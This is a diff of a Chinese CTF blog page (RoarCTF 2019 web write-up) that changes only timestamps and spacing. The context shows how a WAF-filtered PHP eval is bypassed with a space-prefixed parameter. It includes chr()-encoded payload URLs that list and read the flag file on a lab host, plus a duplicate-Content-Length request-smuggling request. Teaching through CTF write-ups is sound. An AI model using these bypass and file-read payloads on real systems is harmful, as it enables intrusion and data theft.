@@ -65,7 +65,7 @@
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;28&#x2F;Roarctf-Web-writeup&#x2F;1572272252121.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;28&#x2F;Roarctf-Web-writeup&#x2F;1572273442458.png">
-<meta property="og:updated_time" content="2019-10-28T15:05:35.496Z">
+<meta property="og:updated_time" content="2019-10-28T15:11:16.191Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;28&#x2F;Roarctf-Web-writeup&#x2F;1572272252121.png">
   <link rel="canonical" href="https://li1m.github.io/2019/10/28/Roarctf-Web-writeup/">
@@ -283,7 +283,7 @@
                 
               
 
-              <time title="Created: 2019-10-28 22:06:10 / Modified: 23:05:35" itemprop="dateCreated datePublished" datetime="2019-10-28T22:06:10+08:00">2019-10-28</time>
+              <time title="Created: 2019-10-28 22:06:10 / Modified: 23:11:16" itemprop="dateCreated datePublished" datetime="2019-10-28T22:06:10+08:00">2019-10-28</time>
             </span>
           
             
@@ -335,12 +335,12 @@
 
 
 <p><img src="1572272252121.png" alt="1572272252121"></p>
-<p>是一个正则匹配，匹配到测试字符则退出，否则eval执行，当时我发现了这个，看了一下，输了phpinfo();发现是403，而之前页面源码告诉了有waf，然后不会做，这里附个链接<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">传送门</a> 发现可以利用PHP的字符串解析特性Bypass，所以传参加一个空格即可绕过</p>
+<p>是一个正则匹配，匹配到测试字符则退出，否则eval执行，当时我发现了这个，看了一下，输了phpinfo();发现是403，而之前页面源码告诉了有waf，然后不会做，这里附个链接 <a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">传送门</a> 发现可以利用PHP的字符串解析特性Bypass，所以传参加一个空格即可绕过</p>
 <p><img src="1572273442458.png" alt="1572273442458"></p>
 <p>看了disable_functions发现该禁的基本上都禁了，之后其实挺简单的，读文件就行，注意之前的正则，这里用ascii编码绕过</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//node3.buuoj.cn:28890/calc.php? num=var_dump(scandir(chr(47)));	//查文件</span></span><br><span class="line">http:<span class="comment">//node3.buuoj.cn:28890/calc.php?num=readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));	//读文件</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//node3.buuoj.cn:28890/calc.php? num=var_dump(scandir(chr(47)));	//查文件</span></span><br><span class="line">http:<span class="comment">//node3.buuoj.cn:28890/calc.php? num=readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));	//读文件</span></span><br></pre></td></tr></table></figure>
 
-<p>看别人的writeup还有一种写法是http走私附个链接<a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">传送门</a> 大概就是用CL发送一个请求让服务器两次处理</p>
+<p>看别人的writeup还有一种写法是http走私附个链接 <a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">传送门</a> 大概就是用CL发送一个请求让服务器两次处理</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /calc.php?num=phpinfo(); HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node3.buuoj.cn:<span class="number">28890</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">70.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">70.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Cookie: __cfduid=df52311039f2f717d63d154645ddf93431564799805</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Pragma: no-cache</span></span><br><span class="line"><span class="comment">Cache-Control: no-cache</span></span><br><span class="line"><span class="comment">Content-Length: 9</span></span><br><span class="line"><span class="comment">Content-Length: 9	//两个C-L，用http走私</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">num=phpinfo();</span></span><br></pre></td></tr></table></figure>
 
 <p>2.easy_java</p>
